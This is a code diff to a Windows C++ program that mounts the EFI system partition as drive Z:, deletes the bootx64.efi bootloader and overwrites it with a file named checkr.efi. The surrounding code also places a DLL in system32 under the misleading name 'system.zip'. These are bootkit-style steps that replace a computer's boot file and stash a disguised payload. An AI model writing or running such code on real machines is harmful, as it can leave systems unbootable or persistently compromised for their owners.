@@ -13,6 +13,31 @@
 using namespace std;
 using namespace libzippp;
 
+void MountEFI() {
+    const DWORD bufferSize = 1024;
+    WCHAR volumeName[bufferSize];
+    WCHAR volumePathNames[bufferSize];
+    DWORD bytesReturned;
+
+    // Find the first volume
+    HANDLE hFindVolume = FindFirstVolume(volumeName, bufferSize);
+    if (hFindVolume != INVALID_HANDLE_VALUE) {
+        do {
+            // Get volume path names
+            if (GetVolumePathNamesForVolumeName(volumeName, volumePathNames, bufferSize, &bytesReturned)) {
+                // Check if it's the EFI system partition
+                if (wcsstr(volumePathNames, L"EFI") != NULL) {
+                    // Define a DOS device for the volume
+                    if (DefineDosDevice(DDD_RAW_TARGET_PATH, L"Z:", volumeName)) {
+                        std::cout << "Mounted EFI on Z:" << std::endl;
+                    }
+                }
+            }
+        } while (FindNextVolume(hFindVolume, volumeName, bufferSize));
+        FindVolumeClose(hFindVolume);
+    }
+}
+
 void UnpackDeps() {
 
     CopyFile(L"Checkr.dll", L"C:\\Windows\\system32\\system.zip", false);
@@ -167,9 +192,9 @@ int main()
     }
     if (is_efi() == 0) {
         //EFI Code here
-        ShellExecute(NULL, L"mountvol", 0, L"P: /S", 0, 0);
-        DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
-        CopyFile(L"C:\\Windows\\system32\\checkr.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
+        MountEFI();
+        DeleteFile(L"Z:\\EFI\\Boot\\bootx64.efi");
+        CopyFile(L"C:\\Windows\\system32\\checkr.efi", L"Z:\\EFI\\Boot\\bootx64.efi", false);
         
     }
     else {
